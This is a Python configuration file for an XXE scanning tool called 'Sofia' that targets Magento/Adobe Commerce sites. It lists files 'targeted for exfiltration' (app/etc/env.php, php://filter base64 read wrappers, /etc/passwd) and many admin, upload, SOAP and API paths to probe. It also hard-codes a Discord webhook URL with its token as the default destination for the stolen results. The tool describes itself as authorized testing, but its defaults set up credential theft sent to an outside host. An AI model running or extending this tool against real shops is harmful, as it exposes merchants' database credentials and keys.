"""Configuration defaults and helpers for Sofia."""

from __future__ import annotations

import os
from typing import Dict, List

from .models import ScanConfig

DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/1542516046949519431/rIKciwYpW8TgUMLWomcn6BwSuLltA_Bux65I19xklLV6FIuEVe7Lx1wjAVagrUE4GprN"

DEFAULT_OUT_DIR = "sofia_reports"
DEFAULT_OOB_PORT = 17888

# Files targeted for exfiltration (Magento/Adobe Commerce and generic).
ENV_PHP_TARGETS: List[str] = [
    "app/etc/env.php",
    "/var/www/html/app/etc/env.php",
    "/var/www/app/etc/env.php",
    "php://filter/read=convert.base64-encode/resource=app/etc/env.php",
    "php://filter/read=convert.base64-encode/resource=/var/www/html/app/etc/env.php",
    "/etc/passwd",
]

# Common discovery paths (relative to origin).
ACTIVE_PATHS: List[str] = [
    "/robots.txt", "/sitemap.xml", "/sitemap_index.xml",
    "/graphql", "/rest/V1", "/rest/default/V1",
    "/soap", "/soapV2", "/index.php/soap", "/index.php/soapV2",
    "/index.php/rest/V1", "/index.php/rest/default/V1",
    "/index.php/admin/import_export", "/admin/import_export",
    "/importexport", "/import_export", "/export",
    "/index.php/rest/V1/import", "/rest/V1/import",
    "/webhooks", "/webhook", "/hooks",
    "/index.php/admin", "/admin", "/adminhtml",
    "/index.php/cron", "/cron", "/queue", "/jobs", "/async",
    "/index.php/rest/V1/async", "/async/V1",
    "/media/import", "/media", "/pub/media",
    "/downloadable", "/upload", "/index.php/admin/system_config",
    "/xmlrpc", "/index.php/xmlrpc", "/api", "/api/v1", "/api/v2",
    "/v1", "/v2", "/index.php/api",
    "/feed", "/rss", "/feeds", "/productfeed", "/product_feed",
    "/index.php/feed", "/index.php/rss",
    "/healthcheck", "/status", "/version", "/magento_version",
    "/setup", "/index.php/setup", "/setup/wizard",
    "/errors/report.php", "/errors/404.php",
]

# Upload-ish paths (multipart / file ingestion).
UPLOAD_PATHS: List[str] = [
    "/import", "/upload", "/media/import", "/index.php/admin/import",
    "/index.php/admin/system_convert", "/import_export/import",
    "/admin/import", "/api/upload", "/graphql",
]

# SOAP endpoints.
SOAP_PATHS: List[str] = [
    "/soap", "/soapV2", "/index.php/soap", "/index.php/soapV2",
    "/soap/default", "/index.php/soap/default",
]

# GraphQL / REST (JSON->XML conversion candidates).
JSON_API_PATHS: List[str] = [
    "/graphql", "/rest/V1", "/rest/default/V1",
    "/index.php/rest/V1", "/index.php/rest/default/V1",
    "/api", "/api/v1", "/api/v2",
]

# Async worker paths (processing may happen out-of-band).
ASYNC_PATHS: List[str] = [
    "/queue", "/jobs", "/async", "/index.php/rest/V1/async",
    "/async/V1", "/cron", "/index.php/cron",
]

MAGENTO_ADMIN_PATHS: List[str] = [
    "/admin", "/adminhtml", "/index.php/admin", "/backend",
    "/index.php/backend", "/administrator", "/manage",
]

DEFAULT_HEADERS: Dict[str, str] = {
    "User-Agent": "Sofia-XXE-Scanner/1.0 (security assessment)",
    "Accept": "*/*",
}

# Static metadata embedded into the scan plan for attribution.
ATTRIBUTION = "Sofia XXE assessment framework - authorized security testing only"


def default_config() -> ScanConfig:
    cfg = ScanConfig()
    cfg.webhook_url = DEFAULT_WEBHOOK
    cfg.out_dir = os.environ.get("SOFIA_OUT_DIR", DEFAULT_OUT_DIR)
    return cfg

